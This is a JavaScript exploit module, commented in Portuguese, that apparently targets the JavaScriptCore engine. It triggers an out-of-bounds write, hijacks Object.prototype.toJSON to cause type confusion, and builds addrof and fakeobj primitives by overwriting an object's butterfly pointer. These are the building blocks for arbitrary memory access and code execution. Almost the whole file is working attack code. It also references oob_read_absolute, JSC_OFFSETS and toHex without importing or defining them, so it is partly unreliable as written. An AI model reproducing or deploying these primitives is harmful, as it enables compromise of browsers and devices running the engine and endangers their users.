// js/script3/exploit_primitives.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64 } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE = "ExploitPrimitives_v1";

// --- Constantes da vulnerabilidade original ---
const HEISENBUG_CORRUPTION_OFFSET = 0x7C;
const HEISENBUG_CORRUPTION_VALUE = 0xFFFFFFFF;
const VICTIM_AB_SIZE = 64;

// --- Variáveis de estado globais para a criação das primitivas ---
let victim_ab = null;
let object_to_leak = null;
let heisenbug_confirmed = false;
let float64_view = null;

function toJSON_addrof_probe() {
    if (Object.prototype.toString.call(this) === '[object Object]') {
        heisenbug_confirmed = true;
        this[0] = object_to_leak;
    }
}

/**
 * Tenta criar e retornar uma primitiva addrof(obj) funcional.
 * Retorna a função addrof em caso de sucesso, ou null em caso de falha.
 */
async function create_addrof_primitive_internal() {
    const FNAME_CREATE = `${FNAME_MODULE}.create_addrof`;
    heisenbug_confirmed = false; // Reset

    await triggerOOB_primitive({ force_reinit: true });
    oob_write_absolute(HEISENBUG_CORRUPTION_OFFSET, HEISENBUG_CORRUPTION_VALUE, 4);
    await PAUSE_S3(50);

    victim_ab = new ArrayBuffer(VICTIM_AB_SIZE);
    float64_view = new Float64Array(victim_ab);

    const originalDesc = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
    Object.defineProperty(Object.prototype, 'toJSON', { value: toJSON_addrof_probe, writable: true, configurable: true, enumerable: false });

    // A chamada a stringify deve acionar a sonda
    JSON.stringify(victim_ab);

    // Restaura o protótipo imediatamente
    if (originalDesc) Object.defineProperty(Object.prototype, 'toJSON', originalDesc);
    else delete Object.prototype.toJSON;

    if (!heisenbug_confirmed) {
        logS3("FALHA ao criar addrof: A Type Confusion (Heisenbug) não foi acionada.", 'error', FNAME_CREATE);
        return null;
    }

    logS3("Type Confusion confirmada. A primitiva addrof foi criada.", "good", FNAME_CREATE);

    // Retorna a função addrof
    return function addrof(obj_to_leak) {
        object_to_leak = obj_to_leak;
        // Re-executa apenas a parte necessária
        JSON.stringify(victim_ab);
        const val_double = float64_view[0];
        const buffer = new ArrayBuffer(8);
        new Float64Array(buffer)[0] = val_double;
        const int_view = new Uint32Array(buffer);
        return new AdvancedInt64(int_view[0], int_view[1]);
    };
}

/**
 * Tenta criar e retornar primitivas { addrof, fakeobj }.
 */
export async function create_exploit_primitives() {
    const FNAME_MAIN = `${FNAME_MODULE}.create_primitives`;
    logS3("--- Tentando criar primitivas de exploração (addrof, fakeobj) ---", 'test', FNAME_MAIN);

    const addrof = await create_addrof_primitive_internal();
    if (!addrof) {
        logS3("Não foi possível continuar para a criação de fakeobj pois addrof falhou.", 'critical', FNAME_MAIN);
        return null;
    }

    // Agora, usamos addrof para criar fakeobj
    logS3("Primitiva Addrof criada. Usando-a para criar a primitiva Fakeobj...", 'info', FNAME_MAIN);

    // Criamos dois arrays. Vamos corromper o segundo para apontar para o endereço do primeiro.
    let obj_leaked = { marker: 'leaked' };
    let obj_corrupted = { a: 1, b: 2 };

    let addr_leaked = addrof(obj_leaked);
    let addr_corrupted = addrof(obj_corrupted);

    logS3(`  Endereço de obj_leaked: ${addr_leaked.toString(true)}`, 'leak', FNAME_MAIN);
    logS3(`  Endereço de obj_corrupted: ${addr_corrupted.toString(true)}`, 'leak', FNAME_MAIN);

    // O offset para o ponteiro 'butterfly' (onde as propriedades são armazenadas)
    // Este valor vem da análise do motor (config.mjs)
    const butterfly_offset = JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET || 0x10;

    // 1. Leia o ponteiro butterfly do objeto corrompido
    const original_butterfly_addr = await oob_read_absolute(addr_corrupted.low() + butterfly_offset, 8);
    // 2. Escreva o endereço do objeto vazado no campo butterfly do objeto corrompido
    await oob_write_absolute(addr_corrupted.low() + butterfly_offset, addr_leaked, 8);

    // Agora, obj_corrupted.a lê da memória de obj_leaked.marker
    logS3(`  Butterfly de obj_corrupted foi sobrescrito.`, 'warn', FNAME_MAIN);
    logS3(`  Acessando obj_corrupted.a -> Deveria ser o valor de obj_leaked.marker`, 'info', FNAME_MAIN);
    logS3(`  Valor de obj_corrupted.a: ${toHex(obj_corrupted.a)}`, 'leak', FNAME_MAIN);


    function fakeobj(address) {
        let addr64 = address;
        if (!(address instanceof AdvancedInt64)) {
            addr64 = new AdvancedInt64(address);
        }
        // Escreve o endereço desejado no campo butterfly
        oob_write_absolute(addr_corrupted.low() + butterfly_offset, addr64, 8);
        return obj_corrupted;
    }

    logS3("Primitiva Fakeobj criada com sucesso!", "vuln", FNAME_MAIN);
    
    // Restaura o butterfly original para estabilidade
    await oob_write_absolute(addr_corrupted.low() + butterfly_offset, original_butterfly_addr, 8);

    return { addrof, fakeobj };
}
